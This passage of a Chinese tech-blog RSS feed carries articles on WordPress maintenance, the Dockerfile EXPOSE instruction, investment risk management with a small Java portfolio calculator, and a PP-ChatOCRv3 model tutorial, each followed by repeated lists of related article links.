包括 1&amp;#xff09;Stanford Dogs 数据集 &amp;#xff0c; 
2&amp;#xff09;14类静态手势自建数据集&amp;#xff0c; 
3&amp;#xff09;imagenet 1000类数据集 
classifica…阅读更多...从传统到智能，从被动监控到主动预警，解锁视频安防平台EasyCVR视频监控智能化升级的关键密钥视频监控技术从传统监控到智能化升级的过程是一个技术革新和应用场景拓展的过程。智能视频监控系统通过集成AI和机器学习算法&amp;#xff0c;能够实现行为分析、人脸识别和异常事件检测等功能&amp;#xff0c;提升了监控的准确性和响应速度。这些系统不仅用于传统的安全防护&amp;#xff0…阅读更多...RabbitMQ 中的交换机学习RabbitMQ 中的交换机学习 一、直接交换机&amp;#xff08;Direct Exchange&amp;#xff09; 
1. 介绍 
Direct 交换机将消息路由到绑定了指定 Routing Key 的队列中。每条消息都有一个 Routing Key&amp;#xff0c;当队列绑定到 Direct 交换机时&amp;#xff0c;它需要一个指定的 Routing Key。…阅读更多...Cocos Creator导出obj文件用于后端寻路Cocos Creator 3.8.0 
用这个扩展插件 
【杨宗宝】两年前写的网格工具&amp;#xff0c;今天将它开源了。 - Creator 3.x - Cocos中文社区carlosyzy_extensions_mesh: Cocos Creator 3.x mesh插件&amp;#xff0c;负责网格数据的导出。合并&amp;#xff0c;拆封等一系列操作 (gitee.com) 
下…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:19:20 +0000</pubDate>
    </item>
    <item>
      <title>电子商务网站维护技巧：保持WordPress、主题和插件的更新</title>
      <link>https://www.ppmy.cn/news/1540904.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维电子商务网站维护技巧：保持WordPress、主题和插件的更新news/2025/10/31 23:19:19/在这个快节奏的数字时代，维护一个电子商务网站的首要任务之一是保持WordPress、主题和插件的最新状态。过时的软件不仅可能导致功能故障，还可能带来安全风险。本文将深入探讨如何有效地更新和维护您的WordPress网站，以确保其安全性和性能。为什么更新很重要？更新WordPress核心、主题和插件的重要性体现在以下几个方面：安全性：每次更新通常都包含安全补丁，修复已知漏洞，防止黑客攻击。性能优化：更新后的软件往往会提升网站加载速度和整体性能。兼容性：确保您的主题和插件与最新的WordPress版本匹配，避免功能冲突。新功能：开发者持续添加新功能和改进现有功能，更新让您能够体验这些最新技术成果。如何进行更新？自动更新方式WordPress提供自动更新功能，您可以为插件和主题启用这一选项。在“仪表板 » 更新”页面，您可以选择启用自动更新功能，确保重要组件在新版本发布时自动更新。这种方式适合那些希望简化维护过程的用户。手动更新方式如果您更喜欢手动控制更新过程，可以定期检查并手动更新。进入“仪表板 » 更新”页面，查看是否有可用更新。一键更新功能让更新过程变得非常简单，只需点击几下即可完成。更新前的备份在进行任何更新前，务必备份网站数据。这样，若更新过程中出现问题，您可以轻松恢复到之前版本。使用Duplicator等备份插件可以帮助您定期创建备份，并将其存储在云端。更新后的功能检查每次更新后，检查网站各个功能是否正常运行非常重要。对电子商务网站而言，确保结账流程、产品页面和用户账户功能无误尤为重要。通过定期测试和监控，您可以及时发现和解决潜在问题，确保客户体验流畅和满意。处理更新引发的问题尽管更新带来诸多好处，但偶尔也会引发问题，如功能冲突或兼容性问题。以下是处理这些问题的一些建议：错误日志监控：检查WordPress的错误日志，识别并解决任何可能出现的问题。插件冲突排查：如果更新后出现问题，尝试逐个停用插件，以确定是否存在插件冲突。回滚更新：如果更新导致严重问题，可以使用备份恢复到之前版本。小结保持WordPress、主题和插件的更新是维护电子商务网站的重要环节。您可以确保网站安全、性能和功能性，为客户提供最佳用户体验。记住，在更新之前进行备份，并在更新后仔细检查网站的各项功能，以确保一切正常运转。http://www.ppmy.cn/news/1540904.html相关文章Dockerfile 中 Expose 命令的作用Dockerfile 中 Expose 命令的作用 
格式是&amp;#xff1a;EXPOSE &lt;端口1&gt; [&lt;端口2&gt;...] 
例如&amp;#xff1a; EXPOSE 8080 8081 8082 
特别注意&amp;#xff1a; 
EXPOSE 指令是声明容器运行时提供服务的端口&amp;#xff0c;请注意这只是一个声明&amp;#xff0c;并没有实际作用&amp;am…阅读更多...中阳金融市场中的风险管理与投资优化策略在全球经济波动性不断加剧的背景下&amp;#xff0c;金融市场的复杂性与不确定性显著增加。作为国际金融市场中的重要组成部分&amp;#xff0c;中阳金融市场吸引了大量投资者的关注。面对风险与机遇并存的市场环境&amp;#xff0c;如何合理制定风险管理与投资优化策略&amp;#xff0c;成为投资者…阅读更多...PP-ChatOCRv3—文档场景信息抽取v3产线使用教程文档场景信息抽取v3产线使用教程 
1. 文档场景信息抽取v3产线介绍 
文档场景信息抽取v3&amp;#xff08;PP-ChatOCRv3&amp;#xff09;是飞桨特色的文档和图像智能分析解决方案&amp;#xff0c;结合了 LLM 和 OCR 技术&amp;#xff0c;一站式解决版面分析、生僻字、多页 pdf、表格、印章识别等常…阅读更多...简单易用的分类任务开源项目 ：classification项目地址&amp;#xff1a;https://gitcode.net/EricLee/classification 
物体识别分类&amp;#xff0c;pytorch 目前数据集 
包括 1&amp;#xff09;Stanford Dogs 数据集 &amp;#xff0c; 
2&amp;#xff09;14类静态手势自建数据集&amp;#xff0c; 
3&amp;#xff09;imagenet 1000类数据集 
classifica…阅读更多...从传统到智能，从被动监控到主动预警，解锁视频安防平台EasyCVR视频监控智能化升级的关键密钥视频监控技术从传统监控到智能化升级的过程是一个技术革新和应用场景拓展的过程。智能视频监控系统通过集成AI和机器学习算法&amp;#xff0c;能够实现行为分析、人脸识别和异常事件检测等功能&amp;#xff0c;提升了监控的准确性和响应速度。这些系统不仅用于传统的安全防护&amp;#xff0…阅读更多...RabbitMQ 中的交换机学习RabbitMQ 中的交换机学习 一、直接交换机&amp;#xff08;Direct Exchange&amp;#xff09; 
1. 介绍 
Direct 交换机将消息路由到绑定了指定 Routing Key 的队列中。每条消息都有一个 Routing Key&amp;#xff0c;当队列绑定到 Direct 交换机时&amp;#xff0c;它需要一个指定的 Routing Key。…阅读更多...Cocos Creator导出obj文件用于后端寻路Cocos Creator 3.8.0 
用这个扩展插件 
【杨宗宝】两年前写的网格工具&amp;#xff0c;今天将它开源了。 - Creator 3.x - Cocos中文社区carlosyzy_extensions_mesh: Cocos Creator 3.x mesh插件&amp;#xff0c;负责网格数据的导出。合并&amp;#xff0c;拆封等一系列操作 (gitee.com) 
下…阅读更多...DB2数据库学习（一）启动DB2数据步骤 
1 切换到用户db2inst1 1. 用户权限 实例用户: DB2 在安装时会为每个数据库实例创建一个专用的操作系统用户&amp;#xff08;如 db2inst1&amp;#xff09;。这个用户拥有管理该实例所需的特定权限。 安全性: 通过限制数据库实例的管理操作&amp;#xff08;如启动和停止&amp;…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:19:19 +0000</pubDate>
    </item>
    <item>
      <title>Dockerfile 中 Expose 命令的作用</title>
      <link>https://www.ppmy.cn/news/1540903.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维Dockerfile 中 Expose 命令的作用news/2025/10/31 23:19:18/Dockerfile 中 Expose 命令的作用格式是：EXPOSE &lt;端口1&gt; [&lt;端口2&gt;...]例如： EXPOSE 8080 8081 8082特别注意：EXPOSE指令是声明容器运行时提供服务的端口，请注意这只是一个声明，并没有实际作用，在容器运行时并不会因为这个声明应用就会开启这个端口的服务。好处：既然没有实际作用，为什么还要有这个命令呢？在 Dockerfile 中写入这样的声明有两个好处，一个是帮助镜像使用者理解这个镜像服务的守护端口，以方便配置映射；另一个用处则是在运行时使用随机端口映射时，也就是docker run -P时，会自动随机映射EXPOSE的端口。注意事项：要将EXPOSE和在运行时使用-p &lt;宿主端口&gt;:&lt;容器端口&gt;区分开来。-p，是映射宿主端口和容器端口，换句话说，就是将容器的对应端口服务公开给外界访问，而EXPOSE仅仅是声明容器打算暴露什么端口而已，并不会自动在宿主进行端口映射。http://www.ppmy.cn/news/1540903.html相关文章中阳金融市场中的风险管理与投资优化策略在全球经济波动性不断加剧的背景下&amp;#xff0c;金融市场的复杂性与不确定性显著增加。作为国际金融市场中的重要组成部分&amp;#xff0c;中阳金融市场吸引了大量投资者的关注。面对风险与机遇并存的市场环境&amp;#xff0c;如何合理制定风险管理与投资优化策略&amp;#xff0c;成为投资者…阅读更多...PP-ChatOCRv3—文档场景信息抽取v3产线使用教程文档场景信息抽取v3产线使用教程 
1. 文档场景信息抽取v3产线介绍 
文档场景信息抽取v3&amp;#xff08;PP-ChatOCRv3&amp;#xff09;是飞桨特色的文档和图像智能分析解决方案&amp;#xff0c;结合了 LLM 和 OCR 技术&amp;#xff0c;一站式解决版面分析、生僻字、多页 pdf、表格、印章识别等常…阅读更多...简单易用的分类任务开源项目 ：classification项目地址&amp;#xff1a;https://gitcode.net/EricLee/classification 
物体识别分类&amp;#xff0c;pytorch 目前数据集 
包括 1&amp;#xff09;Stanford Dogs 数据集 &amp;#xff0c; 
2&amp;#xff09;14类静态手势自建数据集&amp;#xff0c; 
3&amp;#xff09;imagenet 1000类数据集 
classifica…阅读更多...从传统到智能，从被动监控到主动预警，解锁视频安防平台EasyCVR视频监控智能化升级的关键密钥视频监控技术从传统监控到智能化升级的过程是一个技术革新和应用场景拓展的过程。智能视频监控系统通过集成AI和机器学习算法&amp;#xff0c;能够实现行为分析、人脸识别和异常事件检测等功能&amp;#xff0c;提升了监控的准确性和响应速度。这些系统不仅用于传统的安全防护&amp;#xff0…阅读更多...RabbitMQ 中的交换机学习RabbitMQ 中的交换机学习 一、直接交换机&amp;#xff08;Direct Exchange&amp;#xff09; 
1. 介绍 
Direct 交换机将消息路由到绑定了指定 Routing Key 的队列中。每条消息都有一个 Routing Key&amp;#xff0c;当队列绑定到 Direct 交换机时&amp;#xff0c;它需要一个指定的 Routing Key。…阅读更多...Cocos Creator导出obj文件用于后端寻路Cocos Creator 3.8.0 
用这个扩展插件 
【杨宗宝】两年前写的网格工具&amp;#xff0c;今天将它开源了。 - Creator 3.x - Cocos中文社区carlosyzy_extensions_mesh: Cocos Creator 3.x mesh插件&amp;#xff0c;负责网格数据的导出。合并&amp;#xff0c;拆封等一系列操作 (gitee.com) 
下…阅读更多...DB2数据库学习（一）启动DB2数据步骤 
1 切换到用户db2inst1 1. 用户权限 实例用户: DB2 在安装时会为每个数据库实例创建一个专用的操作系统用户&amp;#xff08;如 db2inst1&amp;#xff09;。这个用户拥有管理该实例所需的特定权限。 安全性: 通过限制数据库实例的管理操作&amp;#xff08;如启动和停止&amp;…阅读更多...二叉树习题其二Java【力扣】【算法学习day.9】前言 
前言 书接上篇文章二叉树习题其一&amp;#xff0c;这篇文章我们将基础拓展 
###我做这类文档一个重要的目的还是给正在学习的大家提供方向&amp;#xff08;例如想要掌握基础用法&amp;#xff0c;该刷哪些题&amp;#xff1f;&amp;#xff09;我的解析也不会做的非常详细&amp;#xff0c;只会提供思…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:19:18 +0000</pubDate>
    </item>
    <item>
      <title>中阳金融市场中的风险管理与投资优化策略</title>
      <link>https://www.ppmy.cn/news/1540902.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维中阳金融市场中的风险管理与投资优化策略news/2025/10/31 23:19:17/在全球经济波动性不断加剧的背景下，金融市场的复杂性与不确定性显著增加。作为国际金融市场中的重要组成部分，中阳金融市场吸引了大量投资者的关注。面对风险与机遇并存的市场环境，如何合理制定风险管理与投资优化策略，成为投资者获取稳健回报的关键因素。本文将探讨在中阳金融市场中有效的风险管理与投资优化策略，帮助投资者在复杂的市场环境中实现收益最大化。#### 一、中阳金融市场的主要风险因素1.市场波动风险中阳金融市场与全球经济高度相关，因此市场波动性主要受全球宏观经济事件影响。政治局势变化、全球货币政策调整等外部因素均会对市场产生直接冲击。投资者在制定投资策略时，必须充分考虑市场的波动性，以防止不确定性对资产价格带来的影响。2.流动性风险流动性风险是指在市场需求较低的情况下，投资者无法迅速变现资产的风险。在市场波动剧烈的时期，某些资产的流动性可能大幅下降，导致投资者难以迅速调整投资组合。为此，投资者需选择流动性较好的资产，以降低这一风险。3.信用风险中阳金融市场中的信用风险主要体现在企业和机构的债务偿还能力上。当市场条件恶化时，企业或机构可能会面临债务违约的风险。投资者在进行投资决策时，需要评估资产的信用评级以及公司财务状况，避免因信用问题导致的投资损失。#### 二、优化投资组合的策略1.多元化投资多元化是优化投资组合的基础策略。通过将资金分散投资到不同类型的资产，例如股票、债券、货币等，投资者可以有效降低单一资产价格波动所带来的风险。在中阳金融市场中，投资者应充分利用不同资产类别的波动性特征，实现风险与收益的平衡。2.定期调整投资组合由于市场环境的动态变化，投资者应定期审查并调整投资组合。通过对市场前景、宏观经济数据的分析，适时调整资产配置比例，可以在市场变化中保持投资组合的优化状态。例如，市场风险加剧时，投资者可以增加低风险资产的比例，而在市场乐观时则可以适当增加高风险高收益资产的配置。3.采用对冲策略对冲策略是一种有效的风险管理工具，帮助投资者在保留收益潜力的同时，减少市场下行带来的损失。例如，投资者可以通过买入具有反向相关性的资产或金融衍生品（如期权或期货合约），在市场价格下跌时对冲部分损失，从而降低整体投资组合的波动性。#### 三、技术分析在风险管理中的应用技术分析是一种通过历史价格数据、交易量等市场信息预测未来价格走势的方法。在中阳金融市场中，投资者可以通过技术分析工具，如移动平均线、相对强弱指数（RSI）、布林线等，识别市场趋势并提前做出应对措施。技术分析有助于投资者在波动性较大的市场中捕捉短期交易机会，降低风险。#### 四、总结中阳金融市场为投资者提供了丰富的投资机会，但也伴随着较高的市场风险。通过有效的风险管理和投资组合优化策略，投资者可以更好地应对复杂的市场环境。多元化投资、定期调整投资组合以及合理应用技术分析工具，均是提升投资收益并降低风险的重要方法。在未来的投资过程中，投资者应保持警觉，灵活应对市场变化，抓住机遇，实现稳健的投资回报。---### Java代码示例：计算投资组合的预期回报率与风险以下是一个使用Java编写的简单投资组合分析程序，它通过历史数据计算投资组合的预期回报率与风险，帮助投资者优化投资策略。```javaimport java.util.Scanner;public class PortfolioAnalysis {public static void main(String[] args) {Scanner scanner = new Scanner(System.in);// 输入历史数据：资产A和资产B的预期回报率和权重System.out.println("请输入资产A的预期回报率（%）：");double returnA = scanner.nextDouble();System.out.println("请输入资产B的预期回报率（%）：");double returnB = scanner.nextDouble();System.out.println("请输入资产A的权重（0-1）：");double weightA = scanner.nextDouble();System.out.println("请输入资产B的权重（0-1）：");double weightB = 1.0 - weightA;  // 权重B自动计算为1减去权重A// 计算组合预期回报率double portfolioReturn = (returnA * weightA) + (returnB * weightB);// 输入两个资产的历史波动率（标准差）System.out.println("请输入资产A的波动率（%）：");double volatilityA = scanner.nextDouble();System.out.println("请输入资产B的波动率（%）：");double volatilityB = scanner.nextDouble();// 假设两个资产的相关性为0.2double correlation = 0.2;// 计算组合的风险（标准差）double portfolioVolatility = Math.sqrt(Math.pow(weightA, 2) * Math.pow(volatilityA, 2) +Math.pow(weightB, 2) * Math.pow(volatilityB, 2) +2 * weightA * weightB * volatilityA * volatilityB * correlation);System.out.printf("投资组合的预期回报率为：%.2f%%\n", portfolioReturn);System.out.printf("投资组合的风险（波动率）为：%.2f%%\n", portfolioVolatility);scanner.close();}}```该Java程序通过输入不同资产的预期回报率、权重和波动率，计算出整个投资组合的预期回报率与风险。投资者可以根据这些数据进行合理的资产配置，从而优化投资策略并降低市场风险。http://www.ppmy.cn/news/1540902.html相关文章PP-ChatOCRv3—文档场景信息抽取v3产线使用教程文档场景信息抽取v3产线使用教程 
1. 文档场景信息抽取v3产线介绍 
文档场景信息抽取v3&amp;#xff08;PP-ChatOCRv3&amp;#xff09;是飞桨特色的文档和图像智能分析解决方案&amp;#xff0c;结合了 LLM 和 OCR 技术&amp;#xff0c;一站式解决版面分析、生僻字、多页 pdf、表格、印章识别等常…阅读更多...简单易用的分类任务开源项目 ：classification项目地址&amp;#xff1a;https://gitcode.net/EricLee/classification 
物体识别分类&amp;#xff0c;pytorch 目前数据集 
包括 1&amp;#xff09;Stanford Dogs 数据集 &amp;#xff0c; 
2&amp;#xff09;14类静态手势自建数据集&amp;#xff0c; 
3&amp;#xff09;imagenet 1000类数据集 
classifica…阅读更多...从传统到智能，从被动监控到主动预警，解锁视频安防平台EasyCVR视频监控智能化升级的关键密钥视频监控技术从传统监控到智能化升级的过程是一个技术革新和应用场景拓展的过程。智能视频监控系统通过集成AI和机器学习算法&amp;#xff0c;能够实现行为分析、人脸识别和异常事件检测等功能&amp;#xff0c;提升了监控的准确性和响应速度。这些系统不仅用于传统的安全防护&amp;#xff0…阅读更多...RabbitMQ 中的交换机学习RabbitMQ 中的交换机学习 一、直接交换机&amp;#xff08;Direct Exchange&amp;#xff09; 
1. 介绍 
Direct 交换机将消息路由到绑定了指定 Routing Key 的队列中。每条消息都有一个 Routing Key&amp;#xff0c;当队列绑定到 Direct 交换机时&amp;#xff0c;它需要一个指定的 Routing Key。…阅读更多...Cocos Creator导出obj文件用于后端寻路Cocos Creator 3.8.0 
用这个扩展插件 
【杨宗宝】两年前写的网格工具&amp;#xff0c;今天将它开源了。 - Creator 3.x - Cocos中文社区carlosyzy_extensions_mesh: Cocos Creator 3.x mesh插件&amp;#xff0c;负责网格数据的导出。合并&amp;#xff0c;拆封等一系列操作 (gitee.com) 
下…阅读更多...DB2数据库学习（一）启动DB2数据步骤 
1 切换到用户db2inst1 1. 用户权限 实例用户: DB2 在安装时会为每个数据库实例创建一个专用的操作系统用户&amp;#xff08;如 db2inst1&amp;#xff09;。这个用户拥有管理该实例所需的特定权限。 安全性: 通过限制数据库实例的管理操作&amp;#xff08;如启动和停止&amp;…阅读更多...二叉树习题其二Java【力扣】【算法学习day.9】前言 
前言 书接上篇文章二叉树习题其一&amp;#xff0c;这篇文章我们将基础拓展 
###我做这类文档一个重要的目的还是给正在学习的大家提供方向&amp;#xff08;例如想要掌握基础用法&amp;#xff0c;该刷哪些题&amp;#xff1f;&amp;#xff09;我的解析也不会做的非常详细&amp;#xff0c;只会提供思…阅读更多...03 设计模式-创造型模式-单例模式单例模式&amp;#xff08;Singleton Pattern&amp;#xff09;是 Java 中最简单的设计模式之一。这种类型的设计模式属于创建型模式&amp;#xff0c;它提供了一种创建对象的最佳方式。 
这种模式涉及到一个单一的类&amp;#xff0c;该类负责创建自己的对象&amp;#xff0c;同时确保只有单个对象被创建…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:19:17 +0000</pubDate>
    </item>
    <item>
      <title>PP-ChatOCRv3—文档场景信息抽取v3产线使用教程</title>
      <link>https://www.ppmy.cn/news/1540901.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维PP-ChatOCRv3—文档场景信息抽取v3产线使用教程news/2025/10/31 23:19:16/文档场景信息抽取v3产线使用教程1. 文档场景信息抽取v3产线介绍文档场景信息抽取v3（PP-ChatOCRv3）是飞桨特色的文档和图像智能分析解决方案，结合了 LLM 和 OCR 技术，一站式解决版面分析、生僻字、多页 pdf、表格、印章识别等常见的复杂文档信息抽取难点问题，结合文心大模型将海量数据和知识相融合，准确率高且应用广泛。文档场景信息抽取v3产线中包含表格结构识别模块、版面区域检测模块、文本检测模块、文本识别模块、印章文本检测模块、文本图像矫正模块、文档图像方向分类模块。如您更考虑模型精度，请选择精度较高的模型，如您更考虑模型推理速度，请选择推理速度较快的模型，如您更考虑模型存储大小，请选择存储大小较小的模型。其中部分模型的 benchmark 如下：👉模型列表详情表格结构识别模块模型：模型精度（%）GPU推理耗时 (ms)CPU推理耗时（ms）模型存储大小 (M)介绍SLANet59.52522.5361845.376.9 MSLANet 是百度飞桨视觉团队自研的表格结构识别模型。该模型通过采用CPU 友好型轻量级骨干网络PP-LCNet、高低层特征融合模块CSP-PAN、结构与位置信息对齐的特征解码模块SLA Head，大幅提升了表格结构识别的精度和推理速度。SLANet_plus63.69522.5361845.376.9 MSLANet_plus 是百度飞桨视觉团队自研的表格结构识别模型SLANet的增强版。相较于SLANet，SLANet_plus 对无线表、复杂表格的识别能力得到了大幅提升，并降低了模型对表格定位准确性的敏感度，即使表格定位出现偏移，也能够较准确地进行识别。注：以上精度指标测量PaddleX 内部自建英文表格识别数据集。所有模型 GPU 推理耗时基于 NVIDIA Tesla T4 机器，精度类型为 FP32， CPU 推理速度基于 Intel® Xeon® Gold 5117 CPU @ 2.00GHz，线程数为8，精度类型为 FP32。版面区域检测模块模型：模型mAP(0.5)（%）GPU推理耗时（ms）CPU推理耗时 (ms)模型存储大小（M）介绍PicoDet_layout_1x86.813.091.37.4基于PicoDet-1x在PubLayNet数据集训练的高效率版面区域定位模型，可定位包含文字、标题、表格、图片以及列表这5类区域PicoDet-L_layout_3cls89.315.7159.822.6基于PicoDet-L在中英文论文、杂志和研报等场景上自建数据集训练的高效率版面区域定位模型，包含3个类别：表格，图像和印章RT-DETR-H_layout_3cls95.9114.63832.6470.1基于RT-DETR-H在中英文论文、杂志和研报等场景上自建数据集训练的高精度版面区域定位模型，包含3个类别：表格，图像和印章RT-DETR-H_layout_17cls92.6115.13827.2470.2基于RT-DETR-H在中英文论文、杂志和研报等场景上自建数据集训练的高精度版面区域定位模型，包含17个版面常见类别，分别是：段落标题、图片、文本、数字、摘要、内容、图表标题、公式、表格、表格标题、参考文献、文档标题、脚注、页眉、算法、页脚、印章注：以上精度指标的评估集是 PaddleOCR 自建的版面区域分析数据集，包含中英文论文、杂志和研报等常见的 1w 张文档类型图片。GPU 推理耗时基于 NVIDIA Tesla T4 机器，精度类型为 FP32， CPU 推理速度基于 Intel® Xeon® Gold 5117 CPU @ 2.00GHz，线程数为 8，精度类型为 FP32。文本检测模块模型：模型检测Hmean（%）GPU推理耗时（ms）CPU推理耗时 (ms)模型存储大小（M)介绍PP-OCRv4_server_det82.6983.35012434.01109PP-OCRv4 的服务端文本检测模型，精度更高，适合在性能较好的服务器上部署PP-OCRv4_mobile_det77.7910.6923120.1774.7PP-OCRv4 的移动端文本检测模型，效率更高，适合在端侧设备部署注：以上精度指标的评估集是 PaddleOCR 自建的中文数据集，覆盖街景、网图、文档、手写多个场景，其中检测包含 500 张图片。以上所有模型 GPU 推理耗时基于 NVIDIA Tesla T4 机器，精度类型为 FP32， CPU 推理速度基于 Intel® Xeon® Gold 5117 CPU @ 2.00GHz，线程数为8，精度类型为 FP32。文本识别模块模型：模型识别 Avg Accuracy(%)GPU推理耗时（ms）CPU推理耗时 (ms)模型存储大小（M）介绍PP-OCRv4_mobile_rec78.207.9501846.786810.6 MPP-OCRv4是百度飞桨视觉团队自研的文本识别模型PP-OCRv3的下一个版本，通过引入数据增强方案、GTC-NRTR指导分支等策略，在模型推理速度不变的情况下，进一步提升了文本识别精度。该模型提供了服务端（server）和移动端（mobile）两个不同版本，来满足不同场景下的工业需求。PP-OCRv4_server_rec79.207.19439140.17971.2 M注：以上精度指标的评估集是 PaddleOCR 自建的中文数据集，覆盖街景、网图、文档、手写多个场景，其中文本识别包含 1.1w 张图片。所有模型 GPU 推理耗时基于 NVIDIA Tesla T4 机器，精度类型为 FP32， CPU 推理速度基于 Intel® Xeon® Gold 5117 CPU @ 2.00GHz，线程数为8，精度类型为 FP32。模型识别 Avg Accuracy(%)GPU推理耗时（ms）CPU推理耗时（ms）模型存储大小（M）介绍ch_SVTRv2_rec68.818.36801165.70673.9 MSVTRv2 是一种由复旦大学视觉与学习实验室（FVL）的OpenOCR团队研发的服务端文本识别模型，其在PaddleOCR算法模型挑战赛 - 赛题一：OCR端到端识别任务中荣获一等奖，A榜端到端识别精度相比PP-OCRv4提升6%。注：以上精度指标的评估集是 PaddleOCR算法模型挑战赛 - 赛题一：OCR端到端识别任务A榜。 所有模型 GPU 推理耗时基于 NVIDIA Tesla T4 机器，精度类型为 FP32， CPU 推理速度基于 Intel® Xeon® Gold 5117 CPU @ 2.00GHz，线程数为8，精度类型为 FP32。模型识别 Avg Accuracy(%)GPU推理耗时（ms）CPU推理耗时（ms）模型存储大小（M）介绍ch_RepSVTR_rec65.0710.504751.564722.1 MRepSVTR 文本识别模型是一种基于SVTRv2 的移动端文本识别模型，其在PaddleOCR算法模型挑战赛 - 赛题一：OCR端到端识别任务中荣获一等奖，B榜端到端识别精度相比PP-OCRv4提升2.5%，推理速度持平。注：以上精度指标的评估集是 PaddleOCR算法模型挑战赛 - 赛题一：OCR端到端识别任务B榜。 所有模型 GPU 推理耗时基于 NVIDIA Tesla T4 机器，精度类型为 FP32， CPU 推理速度基于 Intel® Xeon® Gold 5117 CPU @ 2.00GHz，线程数为8，精度类型为 FP32。印章文本检测模块模型：模型检测Hmean（%）GPU推理耗时（ms）CPU推理耗时 (ms)模型存储大小（M)介绍PP-OCRv4_server_seal_det98.2184.3412425.06109PP-OCRv4的服务端印章文本检测模型，精度更高，适合在较好的服务器上部署PP-OCRv4_mobile_seal_det96.4710.5878131.8134.6PP-OCRv4的移动端印章文本检测模型，效率更高，适合在端侧部署注：以上精度指标的评估集是自建的数据集，包含500张圆形印章图像。GPU 推理耗时基于 NVIDIA Tesla T4 机器，精度类型为 FP32， CPU 推理速度基于 Intel® Xeon® Gold 5117 CPU @ 2.00GHz，线程数为 8，精度类型为 FP32。文本图像矫正模块模型：模型MS-SSIM （%）模型存储大小（M)介绍UVDoc54.4030.3 M高精度文本图像矫正模型模型的精度指标测量自 DocUNet benchmark。文档图像方向分类模块模型：模型Top-1 Acc（%）GPU推理耗时（ms）CPU推理耗时 (ms)模型存储大小（M)介绍PP-LCNet_x1_0_doc_ori99.063.848459.237357基于PP-LCNet_x1_0的文档图像分类模型，含有四个类别，即0度，90度，180度，270度注：以上精度指标的评估集是自建的数据集，覆盖证件和文档等多个场景，包含 1000 张图片。GPU 推理耗时基于 NVIDIA Tesla T4 机器，精度类型为 FP32， CPU 推理速度基于 